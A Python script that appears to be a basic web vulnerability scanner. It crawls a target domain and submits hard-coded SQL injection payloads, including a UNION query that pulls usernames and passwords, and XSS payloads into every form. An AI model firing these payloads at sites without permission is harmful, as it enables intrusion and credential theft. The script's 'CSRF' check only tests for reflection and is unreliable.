import requests
import csv
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Debug Mode (Set to True for logs)
DEBUG = True

# Payloads
SQLI_PAYLOADS = [
    "1' OR '1'='1' --", "1\" OR \"1\"=\"1\" --", "1' OR 1=1 --",
    "1) OR (1=1 --", "1') UNION SELECT NULL, NULL --",
    "' UNION SELECT username, password FROM users --"
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>", "\" onmouseover=alert(1) x=\""
]
CSRF_PAYLOAD = {"CSRF_Test": "test_value"}

# SQL Error Signatures
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "sql error", "odbc", "sqlsrv",
    "unclosed quotation mark", "quoted string not properly terminated",
    "you have an error in your sql syntax"
]


def get_links(url, domain):
    """Extract all links from a given webpage"""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()

        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag["href"])
            if domain in link and link not in links:
                links.add(link)

        return links
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to fetch links from {url}: {e}")
        return set()


def get_forms(url):
    """Extract all forms from a webpage"""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to fetch forms from {url}: {e}")
        return []


def submit_form(url, form, payload):
    """Inject payload into form inputs and submit"""
    form_data = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    submit_url = urljoin(url, action) if action else url

    for input_tag in form.find_all(["input", "textarea"]):
        name = input_tag.get("name")
        if name:
            form_data[name] = payload

    try:
        if method == "post":
            response = requests.post(submit_url, data=form_data, timeout=5)
        else:
            response = requests.get(submit_url, params=form_data, timeout=5)

        if DEBUG:
            print(f"[*] Sent payload: {payload} to {submit_url}")
            print(f"[*] Response Length: {len(response.text)}")

        return response.text

    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for {submit_url}: {e}")
        return ""


def scan_forms(url, csv_writer):
    """Scan forms for SQLi, XSS, and CSRF vulnerabilities and save results to CSV"""
    forms = get_forms(url)

    for form in forms:
        sqli_found, xss_found, csrf_found = False, False, False

        for payload in SQLI_PAYLOADS:
            sql_response = submit_form(url, form, payload)
            if any(error in sql_response.lower() for error in SQL_ERRORS):
                csv_writer.writerow(["SQL Injection", url, payload])
                sqli_found = True
                break  # Stop further SQLi tests if found

        for payload in XSS_PAYLOADS:
            xss_response = submit_form(url, form, payload)
            if payload in xss_response:
                csv_writer.writerow(["XSS", url, payload])
                xss_found = True
                break  # Stop further XSS tests if found

        csrf_response = submit_form(url, form, CSRF_PAYLOAD)
        if csrf_response and "CSRF_Test" in csrf_response:
            csv_writer.writerow(["CSRF", url, "Detected"])
            csrf_found = True

        if not (sqli_found or xss_found or csrf_found):
            csv_writer.writerow(["No Vulnerability Found", url, "N/A"])


def scan_website(target_url):
    """Scan a website for vulnerabilities and save results to a CSV file"""
    domain = urlparse(target_url).netloc
    links = get_links(target_url, domain)

    with open("report.csv", "w", newline="") as file:
        csv_writer = csv.writer(file)
        csv_writer.writerow(["Vulnerability Type", "URL", "Payload Used"])

        for link in links:
            scan_forms(link, csv_writer)

    print("\nScan complete. Report saved as 'report.csv'")


# Start scanning
if __name__ == "__main__":
    target = input("Enter URL to scan: ")
    scan_website(target)